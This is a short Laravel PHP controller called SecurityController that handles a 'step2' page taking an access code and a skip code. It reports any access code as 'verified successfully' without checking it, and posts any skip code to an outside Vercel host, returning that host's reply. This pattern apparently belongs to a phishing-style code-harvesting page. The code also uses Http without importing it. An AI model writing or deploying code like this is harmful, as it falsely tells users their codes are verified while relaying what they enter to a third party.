<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class SecurityController extends Controller
{
    public function check(){
        return view('page.step2');
    }

    public function handleUpload(Request $request) {
        $request->validate([
            'access_code' => 'nullable|string',
            'skip_code' => 'nullable|string'
        ]);
    
        
        if ($request->filled('skip_code')) {
            $apiResponse = Http::post('https://megaback-c4jx.vercel.app/api/skip-request', [
                'skipcode' => $request->skip_code
            ]);
    
            if ($apiResponse->successful()) {
                return response()->json([
                    'message' => 'Skip code verified successfully!',
                    'data' => $apiResponse->json()
                ], 200);
            } else {
                return response()->json([
                    'message' => 'Invalid skip code!',
                    'error' => $apiResponse->json()
                ], 422);
            }
        }
    
        return response()->json([
            'message' => 'Access code verified successfully!'
        ], 200);
    }
   
}